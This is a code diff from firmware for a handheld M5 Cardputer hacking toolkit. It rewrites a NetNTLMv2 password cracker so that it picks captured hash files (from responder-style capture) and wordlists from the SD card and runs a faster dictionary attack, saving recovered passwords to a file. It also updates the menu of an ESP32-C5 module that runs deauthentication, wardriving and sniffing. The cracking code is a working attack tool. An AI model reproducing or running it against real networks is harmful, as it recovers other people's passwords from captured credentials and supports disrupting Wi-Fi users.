@@ -28420,14 +28903,131 @@ void drawHashrate(uint32_t hps) {
 }
 
 // =======================
+// Crack NTLMv2 : helpers selection fichier hash + wordlist
+// =======================
+// Ajoute `path` aux candidats s'il existe et contient au moins une ligne hashcat ("user::domain:...").
+void ntlmAddIfHashFile(const String& path, std::vector<String>& out) {
+  if (!SD.exists(path)) return;
+  for (auto& f : out) if (f == path) return;                 // dedup
+  File t = SD.open(path, FILE_READ); if (!t) return;
+  bool looks = false; int lines = 0;
+  while (t.available() && lines < 10) {
+    String l = t.readStringUntil('\n'); lines++;
+    if (l.indexOf("::") >= 0 && l.indexOf(':') != l.lastIndexOf(':')) { looks = true; break; }
+  }
+  t.close();
+  if (looks) out.push_back(path);
+}
+// Scanne un dossier pour tous les .txt ressemblant a des fichiers de hash.
+void ntlmScanDirHashes(const char* dir, std::vector<String>& out) {
+  File d = SD.open(dir); if (!d) return;
+  File e;
+  while ((e = d.openNextFile())) {
+    if (!e.isDirectory()) {
+      String n = e.name(); int sl = n.lastIndexOf('/'); if (sl >= 0) n = n.substring(sl + 1);
+      String low = n; low.toLowerCase();
+      if (low.endsWith(".txt") && e.size() > 0) ntlmAddIfHashFile(String(dir) + "/" + n, out);
+    }
+    e.close();
+  }
+  d.close();
+}
+// Candidats wordlist : connus + tout .txt contenant "wordlist/rockyou/dict" dans /evil*.
+void ntlmScanWordlists(std::vector<String>& out) {
+  const char* known[] = { "/evil/NTLM/ntlm_wordlist.txt", "/evil/wordlist.txt", "/evil/crawler_wordlist.txt" };
+  for (auto p : known) if (SD.exists(p)) { bool dup = false; for (auto& f : out) if (f == p) dup = true; if (!dup) out.push_back(p); }
+  const char* dirs[] = { "/evil", "/evil/NTLM", "/evil/wordlists" };
+  for (auto dir : dirs) {
+    File d = SD.open(dir); if (!d) continue; File e;
+    while ((e = d.openNextFile())) {
+      if (!e.isDirectory()) {
+        String n = e.name(); int sl = n.lastIndexOf('/'); if (sl >= 0) n = n.substring(sl + 1);
+        String low = n; low.toLowerCase();
+        if (low.endsWith(".txt") && e.size() > 0 &&
+            (low.indexOf("wordlist") >= 0 || low.indexOf("rockyou") >= 0 || low.indexOf("dict") >= 0 || low.indexOf("pass") >= 0)) {
+          String full = String(dir) + "/" + n; bool dup = false; for (auto& f : out) if (f == full) dup = true; if (!dup) out.push_back(full);
+        }
+      }
+      e.close();
+    }
+    d.close();
+  }
+}
+// Selecteur vertical simple (M5.Display). Retourne l'index choisi ou -1 si annule.
+int ntlmPick(const String& title, const std::vector<String>& items) {
+  if (items.empty()) return -1;
+  if (items.size() == 1) return 0;
+  const int top0 = 15, lh = menuLineH + 3;                 // meme gabarit que le menu principal
+  const int VIS = (135 - top0 - 12) / lh > 1 ? (135 - top0 - 12) / lh : 1;
+  int idx = 0, top = 0; bool redraw = true;
+  // nb de caracteres qui tiennent a la taille menu (police 6px de large * taille)
+  const int maxch = (int)(236.0f / (6.0f * menuTextSize));
+  for (;;) {
+    if (redraw) {
+      if (idx < top) top = idx; if (idx >= top + VIS) top = idx - VIS + 1;
+      M5.Display.fillScreen(menuBackgroundColor);
+      M5.Display.setTextWrap(false, false);
+      M5.Display.setTextSize(1); M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
+      M5.Display.setCursor(2, 2); M5.Display.println(title);
+      M5.Display.setTextSize(menuTextSize);                 // ELEMENTS a la taille du menu principal
+      for (int i = top; i < (int)items.size() && i < top + VIS; i++) {
+        int y = top0 + (i - top) * lh;
+        if (i == idx) { M5.Display.fillRect(0, y - 1, 240, lh, menuSelectedBackgroundColor); M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor); }
+        else M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        M5.Display.setCursor(4, y);
+        String s = items[i]; if ((int)s.length() > maxch) s = ".." + s.substring(s.length() - (maxch - 2));  // garde le nom de fichier (fin)
+        M5.Display.print(s);
+      }
+      M5.Display.setTextSize(1); M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+      M5.Display.setCursor(2, 135 - 10); M5.Display.print(";/.=move ENT=ok `=cancel");
+      M5.Display.display(); redraw = false;
+    }
+    cardUpdate();
+    if (kp('`') || kp(KEY_BACKSPACE)) { backDebounce(); return -1; }
+    if (kp(KEY_ENTER)) { enterDebounce(); return idx; }
+    if (kp(';')) { idx = (idx + items.size() - 1) % items.size(); redraw = true; delay(140); }
+    if (kp('.')) { idx = (idx + 1) % items.size(); redraw = true; delay(140); }
+    delay(8);
+  }
+}
+
+// =======================
 // Crack NTLMv2
 // =======================
 void crackNTLMv2() {
   ensureFilesExist();
 
-  File hf = SD.open("/evil/NTLM/ntlm_hashes.txt", FILE_READ);
+  // 1) choisir le fichier de hash (inclut desormais /evil/lockpicker/ntlm.txt + scan dossiers)
+  std::vector<String> hashFiles;
+  ntlmAddIfHashFile("/evil/NTLM/ntlm_hashes.txt", hashFiles);
+  ntlmAddIfHashFile("/evil/lockpicker/ntlm.txt", hashFiles);
+  ntlmScanDirHashes("/evil/NTLM", hashFiles);
+  ntlmScanDirHashes("/evil/lockpicker", hashFiles);
+  if (hashFiles.empty()) {
+    M5.Display.fillScreen(TFT_BLACK); M5.Display.setTextSize(1); M5.Display.setTextColor(TFT_RED, TFT_BLACK);
+    M5.Display.setCursor(6, 40); M5.Display.println("No NTLM hash file found.");
+    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK); M5.Display.setCursor(6, 56);
+    M5.Display.println("Capture first (lockpicker/");
+    M5.Display.setCursor(6, 68); M5.Display.println("responder) -> /evil/NTLM or");
+    M5.Display.setCursor(6, 80); M5.Display.println("/evil/lockpicker/ntlm.txt");
+    M5.Display.display();
+    waitAndReturnToMenu("Back To Main Menu");
+    return;
+  }
+  int hsel = ntlmPick("Hash file to crack:", hashFiles);
+  if (hsel < 0) { inMenu = true; drawMenu(); return; }
+  String hashPath = hashFiles[hsel];
+
+  // 2) choisir la wordlist
+  std::vector<String> wls; ntlmScanWordlists(wls);
+  if (wls.empty()) wls.push_back("/evil/NTLM/ntlm_wordlist.txt");
+  int wsel = ntlmPick("Wordlist:", wls);
+  if (wsel < 0) { inMenu = true; drawMenu(); return; }
+  String wordPath = wls[wsel];
+
+  File hf = SD.open(hashPath, FILE_READ);
   if (!hf) {
-    Serial.println("[ERROR] Cannot open /evil/NTLM/ntlm_hashes.txt");
+    Serial.println("[ERROR] Cannot open hash file: " + hashPath);
     waitAndReturnToMenu("Back To Main Menu");
     return;
   }
@@ -28475,6 +29075,15 @@ void crackNTLMv2() {
     String ntProofHex = line.substring(idx3+1, idx4);
     String blobHex  = line.substring(idx4+1);
 
+    // NTLMv2 = challenge 16 hex + NTProof 32 hex. Sinon c'est du NetNTLMv1 (-m 5500, DES) :
+    // ce cracker fait du HMAC-MD5, il ne peut pas -> on saute (a cracker sur PC : hashcat -m 5500).
+    if (challHex.length() != 16 || ntProofHex.length() != 32) {
+      Serial.println("[SKIP] NTLMv1 line (not crackable here, use hashcat -m 5500 on PC): " + user);
+      drawNTLMResult("[SKIP] NTLMv1 (PC -m 5500):\n " + user, false);
+      delay(1200);
+      continue;
+    }
+
     drawNTLMInitUser(user);
 
     uint8_t challenge[8];  hexToBytes(challHex, challenge, 8);
@@ -28501,10 +29110,10 @@ void crackNTLMv2() {
     memcpy(idbuf + u16len, d16, d16len);
     free(u16); free(d16);
 
-    // Ouvrir la wordlist
-    File wf = SD.open("/evil/NTLM/ntlm_wordlist.txt", FILE_READ);
+    // Ouvrir la wordlist choisie
+    File wf = SD.open(wordPath, FILE_READ);
     if (!wf) {
-      Serial.println("[ERROR] No /evil/NTLM/ntlm_wordlist.txt found");
+      Serial.println("[ERROR] Cannot open wordlist: " + wordPath);
       free(blob); free(msg); free(idbuf);
       continue;
     }
@@ -28516,68 +29125,60 @@ void crackNTLMv2() {
     uint32_t lastUpdateTried = 0;
     uint32_t lastUpdateTime  = millis();
 
-    String pwd;
-    pwd.reserve(64);
-    
-    while (wf.available() && !found && !stopRequested) {
-      if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
-        Serial.println("[INFO] Skip requested -> next user");
-        break;
+    // lecture tamponnee (4 Ko) : evite readStringUntil (I/O octet/octet) + 1 String/mot -> gros gain H/s
+    const size_t WBUF = 4096;
+    uint8_t* wbuf = (uint8_t*)malloc(WBUF);
+    size_t wbl = 0, wbp = 0;
+    char pwc[128];
+
+    while (!found && !stopRequested) {
+      if ((tried & 0x3FF) == 0) {                          // clavier : 1 scan / 1024 essais (overhead minimal)
+        cardUpdate();
+        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) { Serial.println("[INFO] Skip -> next user"); break; }
+        if (isBackspacePressed()) { stopRequested = true; break; }
       }
-      if (isBackspacePressed()) {
-        stopRequested = true;
-        break;
+      // lit une ligne dans pwc, sans allouer de String
+      size_t pl = 0; bool eof = false;
+      for (;;) {
+        if (wbp >= wbl) { wbl = wbuf ? wf.read(wbuf, WBUF) : 0; wbp = 0; if (wbl == 0) { eof = true; break; } }
+        char c = (char)wbuf[wbp++];
+        if (c == '\n') break;
+        if (c == '\r') continue;
+        if (pl < sizeof(pwc) - 1) pwc[pl++] = c;
       }
-      String pwd = wf.readStringUntil('\n');
-      pwd.trim();
-      if (pwd.length() == 0) continue;          // skip lignes vides
-      if (pwd[0] == '#' || pwd[0] == ';') continue; // skip commentaires
+      while (pl > 0 && (pwc[pl - 1] == ' ' || pwc[pl - 1] == '\t')) pl--;   // trim fin
+      pwc[pl] = 0;
+      if (pl == 0 || pwc[0] == '#' || pwc[0] == ';') { if (eof) break; else continue; }
 
       uint8_t nthash[16];
-      ntlmHash(pwd.c_str(), nthash);
-
-      // v2Key = HMAC_MD5(NT_hash, UTF16LE(UPPER(user)+domain))
+      ntlmHash(pwc, nthash);
       uint8_t v2key[16];
-      fastHMAC_MD5(nthash, 16, idbuf, u16len + d16len, v2key);
-
-      // resp = HMAC_MD5(v2key, challenge||blob)
+      fastHMAC_MD5(nthash, 16, idbuf, u16len + d16len, v2key);   // v2key = HMAC_MD5(NT, UTF16(UPPER(user)+domain))
       uint8_t resp[16];
-      fastHMAC_MD5(v2key, 16, msg, msgLen, resp);
-
+      fastHMAC_MD5(v2key, 16, msg, msgLen, resp);                // resp = HMAC_MD5(v2key, challenge||blob)
 
       tried++;
-      if ((tried % 1000) == 0) {
+      if ((tried % 2000) == 0) {
         drawNTLMTries(tried);
-        uint32_t processedBytes = wf.position();
+        uint32_t processedBytes = wf.position() - (wbl - wbp);
         drawProgressBar(processedBytes, totalBytes);
         uint32_t now = millis();
         uint32_t elapsed = now - lastUpdateTime;
         if (elapsed > 0) {
-          uint32_t hashes = tried - lastUpdateTried;
-          uint32_t hps = (hashes * 1000UL) / elapsed; // H/s
+          uint32_t hps = ((tried - lastUpdateTried) * 1000UL) / elapsed; // H/s
           drawHashrate(hps);
-          lastUpdateTried = tried;
-          lastUpdateTime  = now;
+          lastUpdateTried = tried; lastUpdateTime = now;
         }
       }
 
-
       if (memcmp(resp, ntProof, 16) == 0) {
-        String foundMsg = "[SUCCESS] \nFOUND password for :\n" + user + ":" + pwd;
+        String foundMsg = "[SUCCESS] \nFOUND password for :\n" + user + ":" + String(pwc);
         Serial.println(foundMsg);
-
-        // --- FEEDBACK : résultat trouvé ---
         drawNTLMResult(foundMsg, true);
-
-        // Sauvegarde dans le fichier
         File foundFile = SD.open("/evil/NTLM/ntlm_found.txt", FILE_APPEND);
         if (foundFile) {
-          foundFile.print(user);
-          foundFile.print("::");
-          foundFile.print(domain);
-          foundFile.print(": ");
-          foundFile.println(pwd);
-          foundFile.close();
+          foundFile.print(user); foundFile.print("::"); foundFile.print(domain);
+          foundFile.print(": "); foundFile.println(pwc); foundFile.close();
         } else {
           Serial.println("[ERROR] Failed to open /evil/NTLM/ntlm_found.txt for writing.");
         }
@@ -28585,7 +29186,9 @@ void crackNTLMv2() {
         found = true;
         break;
       }
+      if (eof) break;
     }
+    free(wbuf);
     if (wf.position() == totalBytes) {
       drawProgressBar(totalBytes, totalBytes);
     }
@@ -29011,7 +29614,7 @@ void loadDeviceNames() {
     }
   }
   f.close();
-  Serial.printf("[*] Noms chargés: %d\n", gNameCount);
+  Serial.printf("[*] Names loaded: %d\n", gNameCount);
 }
 
 void getFriendlyName(int idx, char* out, size_t outsz) {
@@ -33942,7 +34545,7 @@ int parseLDAPSearchResponse(
         }
         else if (t == 0x73) {
             // SearchResultReference (referral)
-            Serial.println("[LDAP] SearchResultReference (referral) reçu (ignoré).");
+            Serial.println("[LDAP] SearchResultReference (referral) received (ignored).");
         }
         // autres protocolOp → ignorés
     }
@@ -36300,6 +36903,7 @@ bool g_c5_deauth_on = true;
 char g_c5_band[6] = "ALL";  // ALL / 2G / 5G
 bool g_c5_ward_on = false;
 bool g_c5_sniff_on = false;
+bool g_c5_led_on = true;
 
 // ===================== AP cache (fixe, no heap) =====================
 typedef struct {
@@ -36436,24 +37040,29 @@ bool c5_parse_script_apline(const char* line) {
 }
 
 bool c5_checkDevicePresent() {
-  c5_uartFlushInput();
-  g_c5_lastAnyRx = 0;
-  c5_sendScriptLine("STOP");
-  delay(100);
-  c5_sendScriptLine("HELP");
+  // The slave can be mid-scan (WiFi.scanNetworks blocks ~0.5 s/channel) and
+  // therefore slow to answer, so retry a few times with a generous window
+  // before declaring it absent. Avoids false "no response" on a good link.
+  for (int attempt = 0; attempt < 3; ++attempt) {
+    c5_uartFlushInput();
+    g_c5_lastAnyRx = 0;
+    c5_sendScriptLine("STOP");
+    delay(80);
+    c5_sendScriptLine("HELP");
 
-
-  uint32_t t0 = millis();
-  while (millis() - t0 < 700) {
-    c5_poll_uart();
-    if (g_c5_lastAnyRx > 0) {
-      Serial.println("[C5] Device detected");
-      return true;
+    uint32_t t0 = millis();
+    while (millis() - t0 < 1200) {
+      c5_poll_uart();
+      if (g_c5_lastAnyRx > 0) {
+        Serial.println("[C5] Device detected");
+        return true;
+      }
+      delay(5);
     }
-    delay(5);
+    Serial.printf("[C5] attempt %d: TX sent, no RX\n", attempt + 1);
   }
 
-  Serial.println("[C5] No ESP32C5 detected");
+  Serial.println("[C5] No ESP32C5 detected (TX ok, no RX)");
   return false;
 }
 
@@ -36495,24 +37104,65 @@ void c5_poll_uart() {
 }
 
 // ===================== UI helpers =====================
+// Small status pill: green = ON, slate = OFF. Immediate-mode, no state.
+void c5_drawChip(LovyanGFX* d, int x, int y, const char* label, bool on) {
+  const int w = 32, h = 13;
+  uint16_t bg = on ? d->color565(34, 197, 94)
+                   : d->color565(40, 48, 61);
+  uint16_t fg = on ? (uint16_t)TFT_BLACK : (uint16_t)menuTextUnFocusedColor;
+  d->fillRoundRect(x, y, w, h, 3, bg);
+  d->setTextSize(1);
+  d->setTextColor(fg, bg);
+  d->setCursor(x + 4, y + 3);
+  d->print(label);
+}
+
+// Derive a human-readable mode string from the (slave-synced) flags.
+const char* c5_modeStr() {
+  if (g_c5_ward_on)                       return "MODE: WARDRIVING";
+  if (g_c5_sniff_on && !g_c5_deauth_on)   return "MODE: SNIFF";
+  if (g_c5_deauth_on)                     return "MODE: DEAUTH+SCAN";
+  return "MODE: SCAN";
+}
+
 void c5_uiHeader(const char* subtitle) {
   M5.Display.fillScreen(menuBackgroundColor);
-  M5.Display.setTextSize(1.5);
-  M5.Display.setCursor(0, 0);
-  M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-  M5.Display.println("ESP32C5 Serial");
-  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-  M5.Display.printf("UART:%lu  Band:%s\n", (unsigned long)C5_BAUD, g_c5_band);
-  M5.Display.printf("Deauth:%s Ward:%s Sniff:%s\n",
-                    g_c5_deauth_on ? "ON" : "OFF",
-                    g_c5_ward_on ? "ON" : "OFF",
-                    g_c5_sniff_on ? "ON" : "OFF");
-  M5.Display.printf("AP:%u\n", (unsigned)g_c5_ap_count);
+  const int W = M5.Display.width();
 
+  // Title bar
+  M5.Display.fillRect(0, 0, W, 16, menuSelectedBackgroundColor);
+  M5.Display.setTextSize(1.5);
+  M5.Display.setCursor(3, 1);
+  M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
+  M5.Display.print("ESP32C5");
+  M5.Display.setTextSize(1);
+  M5.Display.setCursor(W - 52, 4);
+  M5.Display.printf("Band:%s", g_c5_band);
+
+  // Status chips (truthful, synced from the slave)
+  const int cy = 20;
+  c5_drawChip(&M5.Display, 2,   cy, "DEA", g_c5_deauth_on);
+  c5_drawChip(&M5.Display, 38,  cy, "WAR", g_c5_ward_on);
+  c5_drawChip(&M5.Display, 74,  cy, "SNF", g_c5_sniff_on);
+  c5_drawChip(&M5.Display, 110, cy, "LED", g_c5_led_on);
+  M5.Display.setTextSize(1);
+  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  M5.Display.setCursor(150, cy + 3);
+  M5.Display.printf("AP:%u", (unsigned)g_c5_ap_count);
+
+  // Mode line makes mutual exclusivity explicit
+  M5.Display.setCursor(2, 36);
+  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+  M5.Display.print(c5_modeStr());
+
+  int y = 48;
   if (subtitle && subtitle[0]) {
     M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-    M5.Display.println(subtitle);
+    M5.Display.setCursor(2, y);
+    M5.Display.print(subtitle);
+    y += 12;
   }
+  M5.Display.setCursor(0, y);
 }
 
 void c5_uiFooter(const char* hint) {
@@ -36526,7 +37176,7 @@ void c5_uiFooter(const char* hint) {
 void c5_drawRxBlink() {
   const uint32_t BLINK_MS = 120;
   int x = M5.Display.width() - 6;
-  int y = 2;
+  int y = 25;
 
   if (millis() - g_c5_lastRxBlink < BLINK_MS) {
     M5.Display.fillCircle(x, y, 2, TFT_GREEN);
@@ -36842,17 +37492,15 @@ void c5_rawMonitor() {
   for (int i = 0; i < MAX_LINES; ++i) lines[i][0] = 0;
   g_c5_rxpos = 0;
 
-  // ================= HEADER =================
+  // ================= DOUBLE-BUFFER (anti-clignotement) =================
+  const int W = M5.Display.width();
+  const int H = M5.Display.height();
+  M5Canvas cv(&M5.Display);
+  bool spr = cv.createSprite(W, H);   // alloc runtime a l'entree -> zero RAM boot ; libere a la sortie
   M5.Display.clear();
-  M5.Display.setTextSize(1);
-  M5.Display.setCursor(0, 0);
-  M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-  M5.Display.println("C5 RAW MONITOR");
-  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-  M5.Display.println("` or BK to exit");
-  M5.Display.display();
 
   uint32_t lastDraw = 0;
+  bool dirty = true;
 
   // ================= LOOP =================
   while (true) {
@@ -36871,6 +37519,7 @@ void c5_rawMonitor() {
           lines[head][LINE_LEN - 1] = 0;
           head = (head + 1) % MAX_LINES;
           Serial.printf("[C5][MON] %s\n", g_c5_rxline);
+          dirty = true;
         }
         g_c5_rxpos = 0;
       } else if (isprint((uint8_t)c) || c == '\t') {
@@ -36886,37 +37535,43 @@ void c5_rawMonitor() {
     if (kp('`') ||
         kp(KEY_BACKSPACE)) {
       backDebounce();
+      if (spr) cv.deleteSprite();
       return;
     }
 
-    // ---------- DRAW ----------
-    if (millis() - lastDraw > 120) {
+    // ---------- DRAW (double-buffer : redessine seulement sur nouvelle ligne) ----------
+    if (dirty && millis() - lastDraw > 60) {
       lastDraw = millis();
-
-      // clear zone sous le header
-      M5.Display.fillRect(
-        0,
-        HEADER_H,
-        M5.Display.width(),
-        M5.Display.height() - HEADER_H,
-        menuBackgroundColor
-      );
-
-      M5.Display.setCursor(0, HEADER_H);
-      M5.Display.setTextSize(1);
-      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-
-      for (int i = 0; i < MAX_LINES; ++i) {
-        uint8_t idx = (head + i) % MAX_LINES;
-        if (lines[idx][0]) {
-          M5.Display.println(lines[idx]);
+      dirty = false;
+      if (spr) {
+        cv.fillSprite(menuBackgroundColor);
+        cv.fillRect(0, 0, W, HEADER_H, menuSelectedBackgroundColor);
+        cv.setTextSize(1);
+        cv.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
+        cv.setCursor(2, 4); cv.print("C5 RAW MONITOR");
+        cv.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        cv.setCursor(W - 80, 4); cv.print("`/BK exit");
+        cv.setCursor(0, HEADER_H + 1);
+        cv.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        for (int i = 0; i < MAX_LINES; ++i) {
+          uint8_t idx = (head + i) % MAX_LINES;
+          if (lines[idx][0]) cv.println(lines[idx]);
         }
+        cv.pushSprite(0, 0);
+      } else {
+        M5.Display.fillRect(0, HEADER_H, W, H - HEADER_H, menuBackgroundColor);
+        M5.Display.setCursor(0, HEADER_H);
+        M5.Display.setTextSize(1);
+        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+        for (int i = 0; i < MAX_LINES; ++i) {
+          uint8_t idx = (head + i) % MAX_LINES;
+          if (lines[idx][0]) M5.Display.println(lines[idx]);
+        }
+        M5.Display.display();
       }
-
-      M5.Display.display();
     }
 
-    delay(5);
+    delay(3);
   }
 }
 
@@ -36931,6 +37586,63 @@ void c5_promptAndSend(const char* title, const char* prefix) {
   c5_sendScriptLine(cmd);
 }
 
+// ===================== State sync (no UI<->slave divergence) =====================
+// Parse a single "key: VALUE" line from the slave's INFO dump and mirror it into
+// the local UI flags. Prefixes are matched exactly so sniffSendEspNowEnabled does
+// not collide with sniffEnabled.
+void c5_applyInfoLine(const char* l) {
+  if (!l || !l[0]) return;
+  if      (!strncmp(l, "deauthEnabled:", 14)) g_c5_deauth_on = (strstr(l, "ON") != nullptr);
+  else if (!strncmp(l, "wardEnabled:",   12)) g_c5_ward_on   = (strstr(l, "ON") != nullptr);
+  else if (!strncmp(l, "sniffEnabled:",  13)) g_c5_sniff_on  = (strstr(l, "ON") != nullptr);
+  else if (!strncmp(l, "ledEnabled:",    11)) g_c5_led_on    = (strstr(l, "ON") != nullptr);
+  else if (!strncmp(l, "bandMode:",       9)) {
+    if      (strstr(l, "2G")) strncpy(g_c5_band, "2G",  sizeof(g_c5_band) - 1);
+    else if (strstr(l, "5G")) strncpy(g_c5_band, "5G",  sizeof(g_c5_band) - 1);
+    else                      strncpy(g_c5_band, "ALL", sizeof(g_c5_band) - 1);
+    g_c5_band[sizeof(g_c5_band) - 1] = 0;
+  }
+}
+
+// Query the slave's persisted config (INFO) and align the Cardputer UI flags to
+// what the C5 actually holds. Uses only stack-local buffers (no boot RAM cost).
+void c5_syncStateFromInfo() {
+  if (!g_c5_uart_on) return;
+
+  c5_uiHeader("Syncing state");
+  c5_uiFooter("Reading C5 config...");
+
+  c5_uartFlushInput();
+  c5_sendScriptLine("INFO");
+
+  char line[80];
+  uint16_t pos  = 0;
+  uint32_t t0   = millis();
+  uint32_t last = millis();
+
+  while (millis() - t0 < 1500) {
+    while (uartAuto.available()) {
+      char c = (char)uartAuto.read();
+      last = millis();
+      if (c == '\r') continue;
+      if (c == '\n') {
+        line[pos] = 0;
+        if (pos > 0) c5_applyInfoLine(line);
+        pos = 0;
+      } else if (isprint((uint8_t)c)) {
+        if (pos + 1 < sizeof(line)) line[pos++] = c;
+        else                        pos = 0;  // overflow -> reset
+      }
+    }
+    // INFO is a short burst; stop once the slave has gone quiet.
+    if (pos == 0 && millis() - last > 300) break;
+    delay(3);
+  }
+
+  // Ward is exclusive with deauth/sniff on the slave; keep UI consistent.
+  if (g_c5_ward_on) { g_c5_deauth_on = false; g_c5_sniff_on = false; }
+}
+
 void startESP32C5SerialMenu() {
   inMenu = false;
   enterDebounce();
@@ -36940,11 +37652,15 @@ void startESP32C5SerialMenu() {
   c5_uiHeader("Checking ESP32C5");
   c5_uiFooter("sending STOP / HELP");
   delay(1000);
-  if (!c5_checkDevicePresent()) {
+  bool c5present = c5_checkDevicePresent();
+  if (!c5present) {
     c5_uiHeader("ESP32C5 ERROR");
     M5.Display.setTextColor(TFT_RED, menuBackgroundColor);
-    M5.Display.println("No response on UART");
-    M5.Display.println("Check wiring / power");
+    M5.Display.println("TX ok but no RX from C5.");
+    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+    M5.Display.println("Check: common GND,");
+    M5.Display.println("C5 TX -> Cardputer RX,");
+    M5.Display.println("and C5 power.");
     c5_uiFooter("BACKSPACE");
     delay(2500);
   }
@@ -36952,6 +37668,9 @@ void startESP32C5SerialMenu() {
   delay(80);
   c5_poll_uart();
   c5_uartFlushInput();
+
+  // Align the UI with the slave's real (NVS-persisted) state so nothing diverges.
+  if (c5present) c5_syncStateFromInfo();
 
   const char* items[] = {
     "Start", "Stop", "Scan ALL", "Scan (single)", "List",
@@ -36961,35 +37680,58 @@ void startESP32C5SerialMenu() {
     "Target SSID", "Target BSSID", "Target INDEX (manual)", "Target clear",
     "Chan SET", "Chan ADD", "Chan RESET", "Chan CLEAR", "Chan LIST",
     "Interval (ms)", "History (ms)", "Info", "Config", "Help",
-    "Send custom CMD", "Raw monitor", "Back to menu"
+    "Send custom CMD", "Raw monitor",
+    "LED toggle", "Factory reset", "Back to menu"
   };
 
   const int itemCount = sizeof(items) / sizeof(items[0]);
   int index = 0;
   bool need = true;
 
+  // Double-buffer anti-clignotement : sprite plein ecran alloue a l'entree du
+  // menu (runtime) et libere a la sortie -> AUCUNE RAM au boot. Fallback direct
+  // si l'alloc echoue.
+  const int SW = M5.Display.width();
+  const int SH = M5.Display.height();
+  M5Canvas mcv(&M5.Display);
+  bool msp = (mcv.createSprite(SW, SH) != nullptr);
+
   while (true) {
     M5.update();
     cardUpdate();
     c5_poll_uart();
-    c5_drawRxBlink();
+    c5_drawRxBlink();   // indicateur d'activite RX : petit point direct, pas de redraw plein ecran
     if (need) {
-      M5.Display.clear();
+      LovyanGFX* d;
+      if (msp) { mcv.fillSprite(menuBackgroundColor); d = &mcv; }
+      else     { M5.Display.fillScreen(menuBackgroundColor); d = &M5.Display; }
 
-      // 🔹 Infos en haut plus petites
-      M5.Display.setTextSize(1);
-      M5.Display.setCursor(0, 0);
-      M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
-      M5.Display.println("ESP32C5 Toolkit");
-      M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-      M5.Display.printf("Band:%s  Deauth:%s  AP:%u\n", g_c5_band,
-                        g_c5_deauth_on ? "ON" : "OFF", (unsigned)g_c5_ap_count);
-      M5.Display.printf("UART RX%d TX%d\n", C5RxPin, C5TxPin);
+      // ---- Barre de titre ----
+      d->fillRect(0, 0, SW, 14, menuSelectedBackgroundColor);
+      d->setTextSize(1);
+      d->setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
+      d->setCursor(3, 3);
+      d->print("ESP32C5 Toolkit");
+      d->setCursor(SW - 66, 3);
+      d->printf("RX%d TX%d", C5RxPin, C5TxPin);
 
-      // 🔹 Menu principal plus grand
-      const int startY = 30;      // zone plus basse
-      const int lineH = 14;       // hauteur de ligne plus grande
-      const int maxLines = (M5.Display.height() - startY - 12) / lineH;
+      // ---- Miroir de l'etat REEL du C5 (synchro INFO) : chips + MODE + band/AP ----
+      c5_drawChip(d, 2,   16, "DEA", g_c5_deauth_on);
+      c5_drawChip(d, 38,  16, "WAR", g_c5_ward_on);
+      c5_drawChip(d, 74,  16, "SNF", g_c5_sniff_on);
+      c5_drawChip(d, 110, 16, "LED", g_c5_led_on);
+      d->setTextSize(1);
+      d->setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+      d->setCursor(148, 19);
+      d->printf("%s AP:%u", g_c5_band, (unsigned)g_c5_ap_count);
+      d->setCursor(2, 31);
+      d->setTextColor(menuTextFocusedColor, menuBackgroundColor);
+      d->print(c5_modeStr());
+
+      // ---- Liste du menu ----
+      const int startY = 44;
+      const int lineH = 14;
+      const int maxLines = (SH - startY - 12) / lineH;
       int winLines = maxLines < 4 ? 4 : maxLines;
 
       int top = index - winLines / 2;
@@ -36999,20 +37741,25 @@ void startESP32C5SerialMenu() {
       for (int i = 0; i < winLines; ++i) {
         int it = top + i;
         if (it >= itemCount) break;
-
         int y = startY + i * lineH;
         if (it == index) {
-          M5.Display.fillRect(0, y, M5.Display.width(), lineH, menuSelectedBackgroundColor);
-          M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
+          d->fillRect(0, y, SW, lineH, menuSelectedBackgroundColor);
+          d->setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
         } else {
-          M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+          d->setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         }
-        M5.Display.setTextSize(1.5);
-        M5.Display.setCursor(4, y);
-        M5.Display.print(items[it]);
+        d->setTextSize(1.5);
+        d->setCursor(4, y);
+        d->print(items[it]);
       }
 
-      c5_uiFooter("^/v ;/.  ENTER  BACKSPACE");
+      // ---- Footer ----
+      d->setTextSize(1);
+      d->setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
+      d->setCursor(0, SH - 10);
+      d->print(";/. nav  ENTER  BACKSPACE");
+
+      if (msp) mcv.pushSprite(0, 0);
       need = false;
     }
 
@@ -37020,16 +37767,17 @@ void startESP32C5SerialMenu() {
     if (kp(';')) {
       index = (index - 1 + itemCount) % itemCount;
       need = true;
-      delay(140);
+      delay(90);
     }
     if (kp('.')) {
       index = (index + 1) % itemCount;
       need = true;
-      delay(140);
+      delay(90);
     }
 
     if (kp(KEY_BACKSPACE)) {
       backDebounce();
+      if (msp) mcv.deleteSprite();
       break;
     }
 
